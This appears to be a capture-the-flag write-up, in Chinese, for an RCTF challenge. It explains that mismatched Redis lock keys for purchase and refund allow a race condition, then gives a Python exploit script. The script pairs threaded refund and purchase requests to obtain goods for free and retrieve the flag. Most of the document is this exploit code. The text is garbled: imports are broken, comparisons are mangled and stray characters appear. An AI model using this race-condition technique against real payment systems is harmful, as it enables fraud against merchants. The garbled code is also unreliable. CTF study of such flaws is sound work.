---
tags: [条件竞争, Redis, 逻辑漏洞, 支付漏洞]
---

# UltimateFreeloader

观察Redis锁， 发现买和退款的锁的key值不一样， 可以打条件竞争

```
public  Map<String ,  Object>  createOrder(String  userId ,  OrderRequestDTO orderRequest)  {
Map<String ,  Object>  result  =  new  HashMap() ;
String  lockKey  =  "order :user : "  +  userId ;
String  lockValue  =  this .redisLockUtil .generateLockValue() ;
Ⅱ …
}
public  Map<String ,  Object>  refundOrder(String  orderId ,  String  userId)  { Map<String ,  Object>  result  =  new  HashMap() ;
String  lockKey  =  "refund :order : "  +  orderId ;
Ⅱ …
}
```

exp

```
import
import
import
import


requests threading time
uuid


TARGET_URL  =  "<http:Ⅱ61.147.171.105 :49947>"

PROD_LITTLE  =  "550e8400-e29b-41d4-a716-446655440001 "  #  5 .50 PROD_SWEET    =  "550e8400-e29b-41d4-a716-446655440002 "  #  8 .80
PROD_FISH      =  "550e8400-e29b-41d4-a716-446655440003 "  #  4 .20
PROD_LARGE    =  "550e8400-e29b-41d4-a716-446655440004 "  #  10 .00 s  =  requests .Session()
CURRENT_USER  =  { "username " :  " " ,  "password " :  ""}

def  register_and_login() :
username  =  f "hacker__{uuid .uuid4() .hex [ :8]} "
password  =  "password123 "
email  =  f "{username}@hack .com "

CURRENT_USER ["username"]  =  username
CURRENT_USER ["password"]  =  password

print(f "[* ]  注册用户 :  {username}")
try :

res  =  s .post(f "{TARGET_URL}/api/user/register " ,  json={
"username " :  username ,  "password " :  password ,  "email " :  email })
if  res .json () .get("code")  !=  200 :
print(f "[-]  注册失败 :  {res .text}")
exit()
res  =  s .post(f "{TARGET_URL}/api/user/login " ,  json={ "username " :  username ,  "password " :  password
})

token  =  res .json () [ 'data ' ] [ 'token ' ]
s .headers .update({"Authorization " :  f "Bearer  {token}"}) print("[+ ]  token： " ,  token)
user_id  =  res .json () [ 'data ' ] [ 'user ' ] [ 'id ' ]
return  user_id
except  Exception  as  e :
print(f "[-]  连接错误 :  {e}")
exit()

def  get_coupon_id() :
try :
res  =  s .get(f "{TARGET_URL}/api/coupon/available")
data  =  res .json () .get('data ')
if  data :
return  data [0 ] [ 'id ' ] except :
pass
return  None

def  get_balance() :
try :
res  =  s .get(f "{TARGET_URL}/api/user/info")
return  float(res .json () [ 'data ' ] [ 'balance ' ]) except :
return  0 .0

def  buy(product_id ,  coupon_id=None) : data  =  {
"productId " :  product_id ,
"quantity " :  "1 "
}
if  coupon_id :
data ["couponId"]  =  coupon_id

try :
res  =  s .post(f "{TARGET_URL}/api/order/create " ,  json=data)

return  res .json ()
except :
return  None

def  refund(order_id) :
try :
res  =  s .post(f "{TARGET_URL}/api/order/refund/{order_id}")
return  res .json ()
except :
return  None

def  get_my_orders() :
try :
res  =  s .get(f "{TARGET_URL}/api/order/my")
return  res .json () .get( 'data ' ,  []) except :
return  []

def  clean_up_pivot() :
orders  =  get_my_orders()
if  not  orders :  return
for  order  in  orders :
if  order [ 'productId ' ]  =  PROD_LARGE  and  order [ 'status ' ]  =   'COMPLETED ' and  order .get('couponId ') :
refund(order [ 'id ' ])

def  glitch_item(target_prod_id ,  target_name) :
print(f "\\n 汾  尝试 :  {target_name}")

attempt_count  =  0
while  True :
attempt_count  +=  1
orders  =  get_my_orders()
has_target  =  False
target_order_id  =  None
for  order  in  orders :
if  order[ 'productId ' ]  =  target_prod_id  and  order[ 'status ' ]  = 'COMPLETED ' :
has_target  =  True
target_order_id  =  order [ 'id ' ]
break

current_bal  =  get_balance()

if  has_target  and  current_bal  =  10 .0 :
print(f "[+ ]  成功！ 已拥有  {target_name}  且余额为  10 .00")
if  target_prod_id  =  PROD_LARGE :

if  get_coupon_id() :
print("[+ ]  优惠券未使用")
break
else :
refund(target_order_id)
clean_up_pivot()
continue
else :
break
if  has_target  and  current_bal  <  10 .0 :
refund(target_order_id)
clean_up_pivot()
continue
coupon_id  =  get_coupon_id()
if  not  coupon_id :
clean_up_pivot()
continue
res_buy  =  buy(PROD_LARGE ,  coupon_id)

if  not  res_buy  or  res_buy.get('code ')  !=  200 : clean_up_pivot()
continue

pivot_order_id  =  res_buy [ 'data ' ] [ 'order ' ] [ 'id ' ] def  thread_refund() :
refund(pivot_order_id)

def  thread_buy_target() :
buy(target_prod_id)

t1  =  threading.Thread(target=thread_refund)
t2  =  threading.Thread(target=thread_buy_target)

t1 .start()
t2 .start()

t1 .join()
t2 .join()

def  main() :
user_id  =  register_and_login()
target_list  =  [
(PROD_SWEET ,  "Sweet  Potato  (8 .80)") ,   (PROD_LITTLE ,  " Little  Potato  (5 .50)") , (PROD_FISH ,  "Fish  Fish  (4 .20)") ,
(PROD_LARGE ,  " Large  Potato  (10 .00)")
]



for  prod_id ,  name  in  target_list :
glitch_item(prod_id ,  name)
time .sleep(0 .2 )

bal  =  get_balance()
coupon  =  get_coupon_id()
orders  =  get_my_orders()
completed_count  =  sum (1  for  o  in  orders  if  o [ 'status ' ]  =   'COMPLETED ')

print(f "余额 :  {bal}")
print(f "优惠券 :  {'存在(未使用) '  if  coupon  else  '不存在(已使用) '}")
print(f "已购商品数 :  {completed_count}")

if  bal  =  10 .0  and  coupon :
res  =  s .get(f "{TARGET_URL}/api/flag/get")
print(res .text)
else :
print("[-]  失败")

print(f "Username :  {CURRENT_USER [ 'username ' ]}")
print(f "Password :  {CURRENT_USER [ 'password ' ]}")

if      name      =  "    main    " :
一        一         一        一
main()
RCTF{G1ft_F0r_U_My_Br0~}
```

